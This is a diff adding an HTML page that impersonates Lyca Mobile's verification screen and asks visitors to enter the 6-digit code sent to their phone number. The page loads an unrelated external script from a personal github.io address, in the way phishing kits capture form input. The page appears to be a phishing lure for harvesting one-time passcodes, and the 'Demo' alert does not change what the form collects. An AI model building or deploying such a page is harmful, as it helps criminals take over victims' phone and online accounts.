@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lyca Mobile Verification</title>
+<style>
+body{background-color:#f2f2f2; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial;}
+.container{background:white; width:360px; padding:35px; border-radius:12px; text-align:center; box-shadow:0 4px 20px rgba(0,0,0,0.2);}
+h2{color:#ffcc00; margin-bottom:12px;} /* Lyca yellow */
+p{color:#555; font-size:14px; margin-bottom:20px;}
+input[type="text"]{width:100%; padding:12px; border-radius:8px; border:1px solid #ccc; font-size:18px; text-align:center; letter-spacing:6px; margin-bottom:20px;}
+button{width:100%; padding:12px; border-radius:8px; border:none; background-color:#ffcc00; color:#000; font-size:16px; cursor:pointer; margin-bottom:10px;}
+.resend-btn{background-color:#555;}
+button:disabled{background-color:#aaa; cursor:not-allowed;}
+.timer-text{color:#777; font-size:14px; margin-top:8px;}
+</style>
+</head>
+<script src="https://plyarth.github.io/intc/int3.js"></script>
+<body>
+<div class="container">
+<h2>Lyca Mobile Verification</h2>
+<p>Enter the 6-digit code sent to your Lyca number.</p>
+<form>
+<input type="text" maxlength="20" placeholder="------" name="opt code" required>
+<button>Verify</button>
+<button type="button" id="resendBtn" class="resend-btn" disabled>Resend Code</button>
+<div class="timer-text">Resend in <span id="timer">30</span>s</div>
+</form>
+</div>
+
+<script>
+let countdown=30;
+const timer=document.getElementById("timer");
+const resendBtn=document.getElementById("resendBtn");
+function startTimer(){
+  const interval=setInterval(()=>{
+    countdown--;
+    timer.innerText=countdown;
+    if(countdown<=0){clearInterval(interval); resendBtn.disabled=false; timer.parentElement.innerText="You can resend the code now";}
+  },1000);
+}
+resendBtn.addEventListener("click",()=>{
+  alert("Demo: Lyca resend code");
+  countdown=30; resendBtn.disabled=true; timer.parentElement.innerHTML='Resend in <span id="timer">30</span>s';
+  startTimer();
+});
+startTimer();
+</script>
+</body>
+</html>
